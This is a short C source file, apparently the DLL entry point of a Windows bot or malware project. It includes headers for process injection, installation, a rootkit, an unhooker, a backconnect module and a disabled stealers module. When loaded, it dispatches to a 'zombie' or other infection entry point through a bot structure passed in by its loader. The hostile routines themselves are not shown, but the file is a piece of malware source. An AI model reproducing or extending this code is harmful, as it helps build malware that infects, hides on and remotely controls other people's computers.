#include "../common/bot_structs.h"
#include "../common/api.h"
#include "../common/mem.h"
#include "../common/string.h"
#include "../common/utils.h"

#include "zombie.h"
#include "connection.h"
#include "install.h"
#include "os_info.h"
#include "inject.h"
#include "modules.h"
bot_t bot;

#ifdef MODULE_ROOTKIT
#include "rootkit.h"
#include "unhooker.h"
#endif

#ifdef MODULE_BACKCONNECT
#include "backconnect.h"
#endif

// #ifdef MODULE_STEALERS
// #include "stealers.h"
// #endif

#ifdef MODULE_DEBUG
#include "debug.h"
#endif

BOOL WINAPI DllMain(
					_In_ HINSTANCE hinstDLL,
					_In_ DWORD     fdwReason,
					_In_ LPVOID    lpvReserved
					)
{
	switch(fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		//MessageBoxA(0, "test", "test", 0);
#ifndef DEBUG
		bot = *(bot_t*)lpvReserved;
#else
		memzero(&bot, sizeof(bot_t));
#endif
		bot.dwBaseAddress = (DWORD)hinstDLL;

		if(bot.iProcessInfectionType == PROCESS_ZOMBIE_INFECTION)
			ZombieEntryPoint(&bot);
		else
			dwOtherEntryPoint(&bot);
		break;
	}
	return TRUE;
}